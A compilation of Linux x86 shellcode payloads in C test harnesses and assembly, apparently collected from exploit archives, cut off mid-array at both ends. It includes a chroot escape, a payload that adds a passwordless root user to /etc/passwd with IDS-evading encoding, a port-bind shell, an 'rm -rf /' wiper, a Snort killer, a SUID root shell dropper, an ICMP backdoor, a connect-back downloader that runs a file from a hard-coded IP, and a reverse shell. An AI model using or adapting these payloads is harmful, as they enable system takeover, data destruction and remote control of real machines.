    "\x01\xc6\x04\x24\x2e\x89\xe6\x89\xd7\xe8\x09\xff\xff\xff\x3c\x02"
    "\x74\x18\x31\xc0\x50\x68\x2e\x70\x68\x70\x89\xe6\xe8\xf6\xfe\xff"
    "\xff\x3c\x02\x74\x05\xe9\x30\xff\xff\xff\xeb\x0b\x5e\xe8\xb9\xfe"
    "\xff\xff\xe9\x23\xff\xff\xff\xe8\xf0\xff\xff\xff"
    // <html><script>alert("pwn3d")<script></html>
    "\x3c\x68\x74\x6d\x6c\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c"
    "\x65\x72\x74\x28\x22\x70\x77\x6e\x33\x64\x22\x29\x3c\x73\x63\x72"
    "\x69\x70\x74\x3e\x3c\x2f\x68\x74\x6d\x6c\x3e";
    
int main()
{   
  printf("%d\n", strlen(shellcode));
  (*(void (*)()) shellcode)();
  return 0;
}	   



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* This is Linux chroot()/execve() code.It is 80 bytes long.I have some    *
 * ideas how to make it smaller, but till then use this one.               *
 *                                         signed predator                 *
 *                                         linux registered user : 181116  *
 *                                         preedator(at)sendmail(dot)ru    *
 ***************************************************************************/

char sc[]="\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xeb\x36\x5e\x88\x46\x0a"
          "\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x83"
          "\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80\x89\x76\x08\x31"
          "\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x89\xc2\xb0\x0b"
          "\xcd\x80\xe8\xc5\xff\xff\xff/bin/sh..";

int main(){
  int *ret=(int *)(&ret+2);
  printf("len : %d\n",strlen(sc));
  *ret=(int)sc;
}


// Asm code
/*********************************************
 *int main(){                                *
 * __asm__(" xorl %eax,%eax           \n"    *
 *	   " xorl %ebx,%ebx           \n"    *
 *         " xorl %ecx,%ecx           \n"    *
 *	   " movb $0x17,%al           \n"    *
 *	   " int  $0x80               \n"    *
 *         " jmp 0x36                 \n"    *
 *         " popl %esi                \n"    *
 *	   " movb %al,0xa(%esi)       \n"    *
 *         " leal 0x5(%esi),%ebx      \n"    *
 *	   " movb $0xed,%cl           \n"    *
 *	   " movb $0x27,%al           \n"    *
 *	   " int $0x80                \n"    *
 *         " xorl %eax,%eax           \n"    *
 *         " movb $0x3d,%al           \n"    *
 *	   " int $0x80                \n"    * 
 *	   " addl $0x2,%ebx           \n"    *
 *         " movb $0xc,%al            \n"    *
 *	   " int $0x80                \n"    *
 *         " loopne -0x06             \n"    *
 *         " movb $0x3d,%al           \n"    *
 *	   " int $0x80                \n"    *
 *	   " movl %esi,0x8(%esi)      \n"    * 
 *         " xorl %eax,%eax           \n"    * 
 *         " movb %al,0x7(%esi)       \n"    *
 *         " movl %eax,0xc(%esi)      \n"    *
 *         " movl %esi,%ebx           \n"    *
 *         " leal 0x8(%esi),%ecx      \n"    *
 *         " movl %eax,%edx           \n"    *
 *         " movb $0xb,%al            \n"    *
 *         " int $0x80                \n"    *
 *         " call -0x3b               \n"    *
 *         " .string \"/bin/sh..\"    \n");  *
 *}                                          *
 *********************************************/ 

//C code
/**********************************************
*int main(){                                  *
*  char *sh[2]={"/bin/sh",NULL};              *
*  int gg=0xed                                *
*  mkdir("sh..",gg);			      *
*  chroot("sh..");			      *
*  while (gg!=0){                             *
*     chdir("..");gg--;                       *
*  }                                          *
* chroot("..");                               *
* execve(sh[0],sh,NULL);                      *
*}                                            *
***********************************************/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
# Exploit Title: Linux/x86 Polymorphic ShellCode - setuid(0)+setgid(0)+add user 'iph' without password to /etc/passwd
# setuid() - setgid() - open() - write() - close() - exit()
# Date: 30/12/2011
# Author: pentesters.ir
# Tested on: Linux x86 - CentOS 6.0 - 2.6.32-71
# Website: http://pentesters.ir/
# Contact: Cru3l.b0y@gmail.com
# By: Cru3l.b0y
# iph::0:0:IPH:/root:/bin/bash
# This ShellCode is Anti-IDS
# Encode: ADD 10

"\xb0\x17"                  	// mov    $0x17,%al
"\x31\xdb"                  	// xor    %ebx,%ebx
"\xcd\x80"                  	// int    $0x80
"\xb0\x2e"                  	// mov    $0x2e,%al
"\x53"                      	// push   %ebx
"\xcd\x80"                  	// int    $0x80
"\x6a\x05"                   	// push   $0x5
"\x58"                   	// pop    %eax
"\x31\xc9"                	// xor    %ecx,%ecx
"\x51"                   	// push   %ecx
"\x68\x73\x73\x77\x64"       	// push   $0x64777373
"\x68\x2f\x2f\x70\x61"       	// push   $0x61702f2f
"\x68\x2f\x65\x74\x63"       	// push   $0x6374652f
"\x89\xe3"                	// mov    %esp,%ebx
"\x66\xb9\x01\x04"          	// mov    $0x401,%cx
"\xcd\x80"                  	// int    $0x80
"\x89\xc3"                  	// mov    %eax,%ebx
"\x6a\x04"                  	// push   $0x4
"\x58"                      	// pop    %eax
"\x31\xd2"                  	// xor    %edx,%edx
"\x52"                      	// push   %edx
"\x68\x62\x61\x73\x68"       	// push   $0x68736162
"\x68\x62\x69\x6e\x2f"       	// push   $0x2f6e6962
"\x68\x6f\x74\x3a\x2f"       	// push   $0x2f3a746f
"\x68\x3a\x2f\x72\x6f"       	// push   $0x6f722f3a
"\x68\x3a\x49\x50\x48"       	// push   $0x4850493a
"\x68\x3a\x30\x3a\x30"       	// push   $0x303a303a
"\x68\x69\x70\x68\x3a"       	// push   $0x3a687069
"\x89\xe1"               	// mov    %esp,%ecx
"\x6a\x1c"                  	// push   $0x1c
"\x5a"                      	// pop    %edx
"\xcd\x80"                  	// int    $0x80
"\x6a\x06"                   	// push   $0x6
"\x58"                      	// pop    %eax
"\xcd\x80"                   	// int    $0x80
"\x6a\x01"                  	// push   $0x1
"\x58"                      	// pop    %eax
"\xcd\x80"                	// int    $0x80
*/

// ##### ANTI IDS SHELLCODE #####

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char sc[] =
"\xeb\x11\x5e\x31\xc9\xb1\x64\x80\x6c\x0e\xff\x0a\x80\xe9"
"\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\xba\x21\x3b\xe5"
"\xd7\x8a\xba\x38\x5d\xd7\x8a\x74\x0f\x62\x3b\xd3\x5b\x72"
"\x7d\x7d\x81\x6e\x72\x39\x39\x7a\x6b\x72\x39\x6f\x7e\x6d"
"\x93\xed\x70\xc3\x0b\x0e\xd7\x8a\x93\xcd\x74\x0e\x62\x3b"
"\xdc\x5c\x72\x6c\x6b\x7d\x72\x72\x6c\x73\x78\x39\x72\x79"
"\x7e\x44\x39\x72\x44\x39\x7c\x79\x72\x44\x53\x5a\x52\x72"
"\x44\x3a\x44\x3a\x72\x73\x7a\x72\x44\x93\xeb\x74\x26\x64"
"\xd7\x8a\x74\x10\x62\xd7\x8a\x74\x0b\x62\xd7\x8a";

int main()
{
	int (*fp)() = (int(*)())sc;
    	printf("bytes: %u\n", strlen(sc));
    	fp();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Shellcode - portbind (84 bytes)
 *
 *  Copyright (c) 2002 Giuseppe Gottardi 'oveRet' <overet@securitydate.it>
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *
 * 8048304:	6a 66                	push   $0x66
 * 8048306:	58                   	pop    %eax
 * 8048307:	6a 01                	push   $0x1
 * 8048309:	5b                   	pop    %ebx
 * 804830a:	99                   	cltd   
 * 804830b:	52                   	push   %edx
 * 804830c:	53                   	push   %ebx
 * 804830d:	6a 02                	push   $0x2
 * 804830f:	89 e1                	mov    %esp,%ecx
 * 8048311:	cd 80                	int    $0x80
 * 8048313:	52                   	push   %edx
 * 8048314:	43                   	inc    %ebx
 * 8048315:	68 ff 02 0a 93       	push   $0x930a02ff
 * 804831a:	89 e1                	mov    %esp,%ecx
 * 804831c:	6a 10                	push   $0x10
 * 804831e:	51                   	push   %ecx
 * 804831f:	50                   	push   %eax
 * 8048320:	89 e1                	mov    %esp,%ecx
 * 8048322:	89 c6                	mov    %eax,%esi
 * 8048324:	b0 66                	mov    $0x66,%al
 * 8048326:	cd 80                	int    $0x80
 * 8048328:	43                   	inc    %ebx
 * 8048329:	43                   	inc    %ebx
 * 804832a:	b0 66                	mov    $0x66,%al
 * 804832c:	cd 80                	int    $0x80
 * 804832e:	52                   	push   %edx
 * 804832f:	56                   	push   %esi
 * 8048330:	89 e1                	mov    %esp,%ecx
 * 8048332:	43                   	inc    %ebx
 * 8048333:	b0 66                	mov    $0x66,%al
 * 8048335:	cd 80                	int    $0x80
 * 8048337	89 d9			mov    %ebx,%ecx
 * 8048339:	89 c3                	mov    %eax,%ebx
 * 804833b:	b0 3f                	mov    $0x3f,%al
 * 804833d:	49                   	dec    %ecx
 * 804833e:	cd 80                	int    $0x80
 * 8048340:	41                   	inc    %ecx
 * 8048341:	e2 f8                	loop   804833b
 * 8048343:	52                   	push   %edx
 * 8048344:	68 6e 2f 73 68       	push   $0x68732f6e
 * 8048349:	68 2f 2f 62 69       	push   $0x69622f2f
 * 804834e:	89 e3                	mov    %esp,%ebx
 * 8048350:	52                   	push   %edx
 * 8048351:	53                   	push   %ebx
 * 8048352:	89 e1                	mov    %esp,%ecx
 * 8048354:	b0 0b                	mov    $0xb,%al
 * 8048356:	cd 80                	int    $0x80
 *
*/

#include <stdio.h>
#define L_PORT "\x0a\x93"	/* Port 2707 */

char shellcode[] = "\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89"
                   "\xe1\xcd\x80\x52\x43\x68\xff\x02"L_PORT"\x89\xe1"
                   "\x6a\x10\x51\x50\x89\xe1\x89\xc6\xb0\x66\xcd\x80"
                   "\x43\x43\xb0\x66\xcd\x80\x52\x56\x89\xe1\x43\xb0"
                   "\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
                   "\x41\xe2\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
                   "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	void (*f)();
	(long) f = &shellcode; 
	fprintf(stdout, "lenght: %d bytes\n", sizeof(shellcode) - 1);
	f(); 
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
x86 linux rm -rf / which attempts to block the process from being stopped
132 bytes
written by onionring
*/

main()
{
 char shellcode[] =
"\x31\xC0"              // xor eax, eax
"\x89\xC3"              // mov ebx, eax
"\x89\xC1"              // mov ecx, eax
"\x41"                  // inc ecx
"\xB0\x30"              // mov al, 0x30 ; sys_signal
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\xFE\xC3"              // inc bl
"\x80\xFB\x1F"          // cmp bl, 0x1f
"\x72\xF3"              // jb 0xf3
"\x04\x40"              // add al, 0x40 ; sys_getppid
"\xCD\x80"              // int 0x80
"\x89\xC2"              // mov edx, eax
"\x31\xC0"              // xor eax, eax
"\xB0\x02"              // mov al, 0x2 ; sys_fork
"\xCD\x80"              // int 0x80
"\x39\xC0"              // cmp eax, eax
"\x74\x08"              // jnz 0x8
"\x31\xC0"              // xor eax, eax
"\x89\xC3"              // mov ebx, eax
"\xB0\x01"              // mov al, 0x1 ; sys_exit
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\xB0\x42"              // mov al, 0x42 ; sys_setsid
"\xCD\x80"              // int 0x80
"\x43"                  // inc ebx
"\x39\xDA"              // cmp edx, ebx
"\x74\x08"              // jz 0x8
"\x89\xD3"              // mov ebx, edx
"\x31\xC0"              // xor eax, eax
"\x04\x25"              // add al, 0x25 ; sys_kill
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\x50"                  // push eax
"\x68\x6F\x67\x69\x6E"  // push "ogin"
"\x68\x69\x6E\x2F\x6C"  // push "in/l"
"\x68\x2F\x2F\x2F\x62"  // push "///b"
"\x89\xE3"              // mov ebx, esp
"\x31\xC0"              // xor eax, eax
"\x04\x0A"              // add al, 0xa ; sys_unlink
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\x50"                  // push eax
"\x68\x2F\x2F\x2F\x2F"  // push "////"
"\x89\xE2"              // mov edx, esp
"\x50"                  // push eax
"\x68\x2D\x72\x66\x66"  // push "-rff"
"\x89\xE1"              // mov ecx, esp
"\x50"                  // push eax
"\x68\x6E\x2F\x72\x6D"  // push "n/rm"
"\x68\x2F\x2F\x62\x69"  // push "//bi"
"\x89\xE3"              // mov ebx, esp
"\x50"                  // push eax
"\x52"                  // push edx
"\x51"                  // push ecx
"\x53"                  // push ebx
"\x89\xE1"              // mov ecx, esp
"\x31\xD2"              // xor edx, edx
"\x04\x0B"              // add al, 0xb ; sys_execve
"\xCD\x80";             // int 0x80

 (*(void (*)()) shellcode)();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 31 byte setreuid() shellcode - # man shadow
* os: Slackware 9.1, Phlak 2.4, Knoppix 0.1
*
* www.manshadow.org
* r-22@manshadow.org
* irc.efnet.net #_man_shadow
*/

char shellcode[] =
"\x31\xC9"              /* xor ecx,ecx     */
"\x31\xDB"              /* xor ebx,ebx     */
"\x6A\x46"              /* push byte 70    */
"\x58"                  /* pop eax         */
"\xCD\x80"              /* int 80h         */
"\x51"                  /* push ecx        */
"\x68\x2F\x2F\x73\x68"  /* push 0x68732F2F */
"\x68\x2F\x62\x69\x6E"  /* push 0x6E69622F */
"\x89\xE3"              /* mov ebx,esp     */
"\x51"                  /* push ecx        */
"\x53"                  /* push ebx        */
"\x89\xE1"              /* mov ecx,esp     */
"\x99"                  /* cdq             */
"\xB0\x0B"              /* mov al,11       */
"\xCD\x80";             /* int 80h         */

int main(int argc, char *argv[]) {
       void (*sc)() = (void *)shellcode;
       printf("len:%d\n", strlen(shellcode));
       sc();
       return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * x86 linux "snort IDS" shutter shellcode
 * size 151
 *
 * By nob0dy // find your own reality /
 *
 */

char snort_shutter_shellcode[] =
 "\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff"
 "\xff\x83\xc6\x0d\x31\xc9\xb1\x80\x80"
 "\x36\x01\x46\xe2\xfa\xea\x18\x2e\x74"
 "\x72\x73\x2e\x63\x68\x6f\x2e\x71\x6a"
 "\x68\x6d\x6d\x01\x2c\x31\x38\x01\x72"
 "\x6f\x6e\x73\x75\x01\x80\xed\x66\x2a"
 "\x01\x01\xea\x0c\x91\x91\x91\x91\x91"
 "\x91\x91\x91\x91\x91\x91\x91\x91\x54"
 "\x88\xe4\x57\x52\x82\xed\x11\xe9\x01"
 "\x01\x01\x01\x5a\x80\xc2\xca\x11\x01"
 "\x01\x30\xd3\xc6\x44\xf5\x01\x01\x01"
 "\x01\x8c\x82\x08\xee\xfe\xfe\x8c\xb2"
 "\xfb\xef\xfe\xfe\x88\x44\xed\x8c\x82"
 "\x0c\xee\xfe\xfe\x88\x44\xf1\xb9\x0a"
 "\x01\x01\x01\x88\x74\xe9\x8c\x4c\xe9"
 "\x52\x88\xf2\xcc\x81\x82\xc5\x11\x5a"
 "\x5f\x5c\xc2\x91\x91\x91\x91";

int main()
{
 void(* shutdown_snort)() = (void *)snort_shutter_shellcode ;
 shutdown_snort() ;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
   linux/x86 (shamelessly ripped from one of my unpublished exploits)
*/
/*
   fork()'s, does setreuid(0, 0); then execve()'s:
     /bin/sh -c "cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh"
  
   hence dropping a SUID root shell in /tmp.
*/

char shellc[] =
/* Shellcode to drop a SUID root shell in /tmp/sh. 
   Forgive the Intel syntax in the commenting, bored with AT&T syntax..
 */

/* main: if (fork()) goto exeunt; else goto carryon; */
"\x29\xc0"                                 /* sub ax, ax               */
"\xb0\x02"                                 /* mov al, 2                */
"\xcd\x80"                                 /* int 0x80                 */
"\x85\xc0"                                 /* test ax, ax              */
"\x75\x02"                                 /* jnz exeunt               */
"\xeb\x05"                                 /* jmp carryon              */

/* exeunt: exit(x); */
"\x29\xc0"                                 /* sub ax, ax               */
"\x40"                                     /* inc ax                   */
"\xcd\x80"                                 /* int 0x80                 */

/* carryon: setreuid(0, 0); goto callz; */
"\x29\xc0"                                 /* sub ax, ax               */
"\x29\xdb"                                 /* sub bx, bx               */
"\x29\xc9"                                 /* sub cx, cx               */
"\xb0\x46"                                 /* mov al, 0x46             */
"\xcd\x80"                                 /* int 0x80                 */
"\xeb\x2a"                                 /* jmp callz                */

/* start: execve() */
"\x5e"                                     /* pop si                   */
"\x89\x76\x32"                             /* mov [bp+0x32], si        */
"\x8d\x5e\x08"                             /* lea bx, [bp+0x08]        */
"\x89\x5e\x36"                             /* mov [bp+0x36], bx        */
"\x8d\x5e\x0b"                             /* lea bx, [bp+0x0b]        */
"\x89\x5e\x3a"                             /* mov [bp+0x3a], bx        */
"\x29\xc0"                                 /* sub ax, ax               */
"\x88\x46\x07"                             /* mov [bp+0x07], al        */
"\x88\x46\x0a"                             /* mov [bp+0x0a], al        */
"\x88\x46\x31"                             /* mov [bp+0x31], al        */
"\x89\x46\x3e"                             /* mov [bp+0x3e], ax        */
"\x87\xf3"                                 /* xchg si, bx              */
"\xb0\x0b"                                 /* mov al, 0x0b             */
"\x8d\x4b\x32"                             /* lea cx, [bp+di+0x32]     */
"\x8d\x53\x3e"                             /* lea dx, [bp+di+0x3e]     */
"\xcd\x80"                                 /* int 0x80                 */

/* callz: call start */
"\xe8\xd1\xff\xff\xff"                     /* call start               */

/* data - command to execve() */
"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f"
"\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x34"
"\x37\x35\x35\x20\x2f\x74\x6d\x70\x2f\x73\x68";

/** test out the shellcode **/
main ()
{
  void (*sc)() = (void *)shellc; sc();
}


		

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;
; Copyright (c) 2007 by <mu-b@digit-labs.org>
;
; 235-byte raw-socket ICMP/checksum shell - (x86-lnx)
; by mu-b - Nov 2006
;
; icmp with identifier __flag_byte and commands in the
; following format:-
;       "/bin/sh\x00-c\x00<command here>\x00"
;
; unlike *other* icmp shells, this will reply with
; 255-(sizeof icmp_hdr) bytes of output..
;

%define zero_reg        esi
%define zero_reg_w      si
%define sock_reg        edi
%define __flag_byte     6996h

global _shell

_shell:
 xor   zero_reg, zero_reg
 mov   ebp, esp

 ; sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
_socket:
 lea   ebx, [zero_reg+3]
 push  byte 1
 push  ebx
 dec   ebx
 push  ebx
 dec   ebx
 mov   ecx, esp
 lea   eax, [zero_reg+66h]
 int   80h                 ; socket();
 mov   sock_reg, eax

 ; setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &1, 1);
_setsockopt:
 push  ebx
 push  esp
 push  byte 3h
 push  zero_reg
 push  sock_reg
 mov   ecx, esp
 mov   bl, byte 0eh
 mov   al, byte 66h
 int   80h                 ; setsocketopt();

 ; while(1)
_while_loop:
 ; read(sockfd, cmd, 255);
 cdq
 dec   byte dl
 mov   ecx, ebp
 mov   ebx, sock_reg
 lea   eax, [zero_reg+3]
 int   80h                 ; read();

 lea   ebx, [ebp+24]
 xor   [ebx], word __flag_byte
 jne   short _while_loop

 ; pipe(pp)
 lea   ebx, [ebp-8]
 mov   al, byte 2ah
 int   80h                 ; pipe();

 ; fork()
 mov   al, byte 2h
 int   80h                 ; fork();
 test  eax, eax
 jnz   short _parent

_child:
 ; close(pp[0])
 mov   ebx, [ebp-8]
 mov   al, byte 6h
 int   80h                 ; close();

 ; dup2(pp[1], 0); dup2(pp[1], 1); dup2(pp[1], 2);
 lea   ecx, [zero_reg+3]
 ; pp[1] == pp[0]+1
 inc   ebx

.1:
 dec   ecx
 mov   al, byte 3fh
 int   80h                 ; dup2();
 jnz   .1

 ; execve(cmd + 28, {cmd + 28, cmd + 36, cmd + 39, 0}, 0);
 push  zero_reg
 lea   ebx, [ebp+39]
 push  ebx
 sub   ebx, byte 3
 push  ebx
 sub   ebx, byte 8
 push  ebx
 mov   ecx, esp
 cdq
 mov   al, byte 0bh
 int   80h                 ; execve();

_parent:
 ; close(pp[1])
 mov   ebx, [ebp-4]
 lea   eax, [zero_reg+6]
 int   80h                 ; close();

_parent_read:
.1:
 ; read(pp[0], cmd, bytes_left);
 ; edx == 255
 lea   ecx, [ebp+28]
 mov   ebx, [ebp-8]
 mov   al, byte 3h
 int   80h                 ; read();
 test  eax, eax
 jl    _while_loop

 mov   al, byte 6h
 int   80h                 ; close();

.2:
 ; fix up ttl (optional?! make sure its high!)
 ; mov   [ebp+8], byte 0ffh

 ; switch ip's
 mov   ecx, [ebp+12]
 xchg  [ebp+16], ecx
 mov   [ebp+12], ecx

 ; set icmp type to echo reply (optional?!)
 ;mov   [ebp+20], word zero_reg_w
 ; zero checksum
 ;mov   [ebp+22], word zero_reg_w
 ; set icmp type to echo and zero checksum
 mov   [ebp+20], zero_reg

 lea   ecx, [zero_reg+117]
 lea   esi, [ebp+20]
 cdq

.3:
 lodsw
 add   edx, eax
 loop  .3

 lodsb
 xor   ah, ah
 add   eax, edx
 mov   esi, eax

 shr   eax, byte 16
 movzx esi, si
 add   eax, esi
 mov   edx, eax
 shr   edx, byte 16
 add   eax, edx
 not   ax

 ; set checksum
 mov   [ebp+22], word ax

 cdq
 xor   eax, eax
 xor   zero_reg, zero_reg

 ; struct sockaddr *
 push  zero_reg
 push  zero_reg
 push  dword [ebp+16]
 push  byte 2

 ; sendto(sockfd, cmd, 255, 0, ...);
 mov   ecx, esp
 push  byte 16
 push  ecx
 push  zero_reg
 mov   dl, byte 0ffh
 push  edx
 push  ebp
 push  sock_reg
 mov   ecx, esp
 mov   bl, 0bh
 mov   al, 66h
 int   80h                 ; sendto();

 cdq
 mov   ecx, ebp
 mov   ebx, zero_reg
 mov   al, 72h
 int   80h                 ; wait();

 jmp   _while_loop




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
;file download shellcode (149 bytes)
;
;connect back, download a file and execute.  
;modify the name of the file and the ip address first.
;
;militan
;Advanced Defense Lab(ADL)
;



global _start

_start:

xor ecx,ecx
mul ecx
xor ebx,ebx
cdq

;socket
push eax
push byte 0x1
push byte 0x2
mov ecx,esp
inc ebx
mov al,0x66
int 0x80
mov edi,eax             ;edi=sockfd


;connect,port(9999)=270f ip(140.115.53.35)=(8c.73.35.23)  
push edx
push long 0x2335738c     ;address *
push word 0x0f27        ;port    * 
mov dl,0x02
push dx                 ;family  1
mov ecx,esp              ;adjust struct
push byte 0x10
push ecx   
push edi                ;sockfd
mov ecx,esp             
mov bl,3                
mov al,102
int 0x80

;sys_open(cb,O_WRONLY|O_CREATE|O_TRUNC[0001.0100.1000=1101],700)
xor ebx,ebx
xor ecx,ecx
push ecx
push word 0x6263        ;file name="cb" 
mov ebx,esp
mov cx,0x242            
mov dx,0x1c0            ;Octal
mov al,5
int 0x80
mov esi,eax             ;esi=fd


;
xor ecx,ecx
mul ecx
cdq
mov dx,0x03e8         ;memory chunk=1000=0x03e8: read per time       
    
L1:                         
;sys_read(socket sockfd,buf,len)            
xor ebx,ebx
xor eax,eax
mov al,3
mov ebx,edi            ;edi=sock fd
lea ecx,[esp-1000]      ;memory chunk
int 0x80
;sys_write(fd,*buf,count)
mov ebx,esi               
mov edx,eax              
xor eax,eax
mov al,4
int 0x80
cmp dx,0x03e8          
je L1                  ;loop


CONTINUE:
;sys_close(fd)
mov ebx,esi             
xor eax,eax
mov al,6
int 0x80

;execve[./cb,0]      
xor ecx,ecx
mul ecx
push ecx
push word 0x6263       ;file name="cb" 
mov ebx,esp
push ecx
push ebx                  
mov ecx,esp              
mov al,0x0b
int 0x80


EXIT:
xor eax,eax
xor ebx,ebx 
inc eax
int 0x80
*/

#include<stdio.h>
#include<string.h>
#include<stdlib.h>


unsigned char shellcode[]="\x31\xc9\xf7\xe1\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\x43\xb0\x66\xcd\x80"
"\x89\xc7\x52\x68\x8c\x73\x35\x23\x66\x68\x27\x0f\xb2\x02\x66\x52\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x03\xb0\x66\xcd\x80"
"\x31\xdb\x31\xc9\x51\x66\x68\x63\x62\x89\xe3\x66\xb9\x42\x02\x66\xba\xc0\x01\xb0\x05\xcd\x80"

"\x89\xc6\x31\xc9\xf7\xe1\x99\x66\xba\xe8\x03\x31\xdb\x31\xc0\xb0\x03\x89\xfb\x8d\x8c\x24\x18\xfc\xff\xff\xcd\x80\x89\xf3\x89\xc2\x31\xc0\xb0\x04\xcd\x80"
"\x66\x81\xfa\xe8\x03\x74\xde\x89\xf3\x31\xc0\xb0\x06\xcd\x80\x31\xc9\xf7\xe1\x51\x66\x68\x63\x62\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
"\x31\xc0\x31\xdb\x40\xcd\x80";

void k(){
 int *ret;
 ret=(int *)&ret+2;
 (*ret)=(int)shellcode;
}

int main (){
  k();
  return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Connecting shellcode written by lamagra <lamagra@digibel.org>
http://lamagra.seKure.de

May 2000

.file	"connect"
.version	"01.01"
.text
	.align 4
_start:
	#socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	movl %esp,%ebp
	xorl %edx,%edx
	movb $102,%edx
	movl %edx,%eax		# 102 = socketcall
	xorl %ecx,%ecx
	movl %ecx,%ebx
	incl %ebx	 		# socket()
	movl %ebx, -8(%ebp)	# 1 = SOCK_STREAM
	incl %ebx
	movl %ebx, -12(%ebp)	# 2 = AF_INET
	decl %ebx			# 1 = SYS_socket
	movl %ecx, -4(%ebp)	# 0 = IPPROTO_IP 
	leal -12(%ebp),%ecx	# put args in correct place
	int  $0x80			# switch to kernel-mode
	xorl %ecx,%ecx
	movl %eax,-12(%ebp)	# save the fd

	# connect(fd,(struct sockaddr *)&struct,16);
	incl %ebx
	movw %ebx,-20(%ebp)	# 2 = PF_INET
	movw $9999,-18(%ebp)	# 9999 = htons(3879);
	movl $0x100007f,-16(%ebp) # htonl(IP) 
	leal -20(%ebp),%eax	# struct sockaddr
	movl %eax,-8(%ebp)	# load the struct
	movb $16,-4(%ebp)		# 16 = sizeof(sockaddr)
	movl %edx,%eax		# 102 = socketcall
	incl %ebx			# 3 = SYS_connect
	leal -12(%ebp),%ecx	# put args in place
	int  $0x80			# call socketcall()

	# dup2(fd,0-1-2)
	xorl %ecx,%ecx
	movb $63,%eax		# 63 = dup2()
	int  $0x80
        incl %ecx
        cmpl $3,%ecx
        jne  -0xa

	# arg[0] = "/bin/sh"
	# arg[1] = 0x0
	# execve(arg[0],arg);
	jmp  0x18
	popl %esi
	movl %esi,0x8(%ebp)
	xorl %eax,%eax
	movb %eax,0x7(%esi)
	movl %eax,0xc(%ebp)
	movb $0xb,%al
	movl %esi,%ebx
	leal 0x8(%ebp),%ecx	
	leal 0xc(%ebp),%edx	
	int  $0x80	
	call -0x1d
	.string "/bin/sh"
*/

#define NAME "connecting"

char code[]=
"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\xc7\x45\xf0"
"\x7f\x01\x01\x01\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0"
"\x43\x8d\x4d\xf4\xcd\x80\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x03"
